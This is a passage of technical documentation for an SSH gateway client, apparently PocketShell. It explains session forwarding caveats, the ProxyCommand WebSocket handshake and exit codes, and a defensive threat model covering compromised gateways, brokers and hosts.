`IdentitiesOnly=yes`, only that key is offered, and `ForwardAgent=no`
still holds. When ssh exits, or on Ctrl-C, SIGTERM/SIGHUP or an error,
the agent is killed and the directory removed. `--key` is never implied:
without it, nothing reads the vault or asks for a password. `--key` and
`-i` are mutually exclusive.

Things worth knowing about the session itself:

- **Forward bind addresses.** `-L 8080:…` and `-D 1080` listen on your
  laptop's loopback only, but a bind address is honoured as given:
  `-L '*:8080:…'`, `-L 0.0.0.0:8080:…` or `-D '*:1080'` listen on **all**
  of the laptop's interfaces, so anyone on your network can reach the
  host's forwarded service (or use the SOCKS proxy). Leave the bind
  address out unless you mean that.
- **Terminal.** The host controls what your terminal receives. Prefer a
  terminal emulator with OSC 52 clipboard *writes* and answerback/title
  reporting disabled, so a hostile host can neither fill your clipboard
  with a command nor make your terminal type into the session.
- **Escape character.** `~` stays the escape character (`~.` to drop a
  hung session, `~^Z`, `~#`, `~?` all work); only the `~C` command line is
  disabled (`EnableEscapeCommandline=no`, OpenSSH ≥ 9.2), so forwards
  cannot be added mid-session. On older OpenSSH `~C` remains available.

### 9.5 `gateway proxy DEVICE_ID` (the ProxyCommand)

Normally started by `gateway ssh`. Dials
`wss://<gw>/api/v1/hosts/<id>/ssh` (no query, no Origin header, no
compression, no environment proxy), sends
`{"type":"auth","v":1,"token":…,"device_id":…}` as the first text frame,
and requires a strict `ready` frame (exact keys and types, `v` = 1, no
duplicate keys or NaN, ≤ 16 KiB) whose `device_id` equals the requested
one — all within one 30 s deadline covering TCP, TLS, the upgrade and
`ready`. `ready.ssh_host_key` is ignored. Then it pumps raw SSH bytes as
binary messages (≤ 32 KiB per write; inbound messages > 64 KiB, binary
data before `ready`, or any text after `ready` abort the session). stdout
carries SSH payload only; stdin EOF closes the WebSocket; a WebSocket
close ends the process. Gateway error messages are printed to stderr only
after stripping ANSI/VT sequences and every Unicode control/format
character (bidi overrides, zero-width), on one line, capped at 200
characters; unexpected errors print a one-line class name, never a
traceback.

| Exit | Meaning |
| --- | --- |
| 0 | clean end (stdin EOF, normal close) |
| 1 | unexpected local error |
| 2 | usage (bad device id / server) |
| 3 | not logged in / no gateway token |
| 4 | connect, TLS or HTTP-upgrade failure; unclassified refusal |
| 5 | handshake timeout (local deadline or close 4408) |
| 6 | gateway protocol violation (local detection or close 4400) |
| 7 | unauthorized (close 4401/4403) |
| 8 | unknown, revoked or not your device (close 4404) |
| 9 | host offline (close 4503) |
| 10 | quota (close 4429) |
| 11 | connection lost after `ready` |

### 9.6 Client-side threat model

The security goal: a compromised gateway, broker or enrolled host must not
get into the client's machine.

**A compromised gateway** sees only ciphertext (SSH is end to end with
the host's sshd) and cannot impersonate the host: the host key is checked
by OpenSSH against your independent pin, never against anything the
gateway sends (`ready.ssh_host_key` and `devices` are advisory). It
**can**: deny or drop service; see connection metadata (which device, when,
traffic volume); replay the broker token you sent it against the gateway
identity API for up to five minutes (enroll/revoke devices — the token is
gateway-scoped and does not reach your account itself); send hostile
frames — which are size-bounded, strictly parsed, and sanitized before any
byte reaches your terminal; nothing it sends reaches stdout except SSH
payload consumed by ssh itself. It cannot make ssh forward your agent,
X11, or local ports (all off, and your ssh_config is ignored), and it
cannot inject options into the ssh or ProxyCommand line.

**A compromised broker** can mint tokens and, with them, use the gateway
identity API as you — including listing and revoking devices. It still
cannot pass host-key verification for a pinned device, so it cannot
intercept or impersonate your SSH sessions or reach your machine.

**A compromised enrolled host** controls everything inside the SSH
session it serves: output it shows you (escape sequences included —
the same exposure as any SSH session), and any port you explicitly
forward with `-L`/`-D` reaches a service *it* chose. It gets no agent, no
X11, no remote forwarding (`-R` is refused), no escape command line, and
no shared control socket. When pinning, the key line it prints is data
(one validated `<keytype> <base64>` line), never a command, so a hostile
host cannot trick you into running something by pasting.

**Your SSH keys never reach PocketShell's servers.** With `-i` or the
default `~/.ssh` files, OpenSSH reads the key locally. With `--key`, the
key comes from the device-password vault ([keys.md](keys.md)): a local
file that is never synced, decrypted only in this process with a password
typed on this device, and handed to a private agent on this device.
Neither the broker, the gateway nor the sync service ever holds a usable
private key, the device password or a key passphrase. A compromised
server therefore has no way to log in to your hosts as you, and no way
into your devices.

**Not covered:** a compromised client machine (it holds the login
session, the pins and your SSH keys; for vault keys, malware running as
you can capture the device password as you type it, or use the private
agent during its 120 s key lifetime); you pinning a key without checking
where it came from; hosts whose sshd still allows non-key authentication
(see §2.1); denial of service by any party on the path.
